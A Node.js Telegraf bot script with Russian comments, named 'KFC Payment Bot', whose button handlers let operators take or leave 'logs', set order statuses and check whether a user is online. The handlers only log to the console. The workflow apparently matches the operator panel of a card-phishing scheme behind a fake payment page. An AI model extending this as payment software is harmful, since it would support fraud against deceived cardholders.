const { Telegraf } = require('telegraf');
const config = require('./telegram-bot-config');

// Создаем простого бота для обработки платежей
const bot = new Telegraf(config.bot.token);

// Обработка ошибок
bot.catch((err, ctx) => {
  console.error('Telegram bot error:', err);
});

// Команда для проверки работы бота
bot.command('start', (ctx) => {
  ctx.reply('🤖 KFC Payment Bot активен!\n\nЭтот бот обрабатывает платежи для KFC приложения.');
});

// Обработка callback queries для статусов платежей
bot.action(/^log_(.+)_setStatus_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const status = ctx.match[2];
  
  console.log(`Payment status updated: Order ${orderId} -> ${status}`);
  
  // Здесь можно добавить логику обновления статуса в базе данных
  // и уведомление пользователя через веб-сокеты или polling
  
  await ctx.answerCbQuery(`Статус обновлен: ${status}`);
});

// Обработка взятия лога в работу
bot.action(/^log_take_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  console.log(`Log taken: Order ${orderId}`);
  await ctx.answerCbQuery('Лог взят в работу');
});

// Обработка отказа от лога
bot.action(/^log_(.+)_leave$/, async (ctx) => {
  const orderId = ctx.match[1];
  console.log(`Log left: Order ${orderId}`);
  await ctx.answerCbQuery('Отказ от лога');
});

// Обработка проверки онлайн статуса
bot.action(/^eye_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  console.log(`Eye check: Order ${orderId}`);
  await ctx.answerCbQuery('Проверка онлайн статуса');
});

// Запуск бота
bot.launch().then(() => {
  console.log('🤖 KFC Payment Bot запущен!');
  console.log('Bot Token:', config.bot.token.substring(0, 10) + '...');
  console.log('Logs Group ID:', config.bot.logsGroupId);
}).catch((error) => {
  console.error('Ошибка запуска бота:', error);
});

// Graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
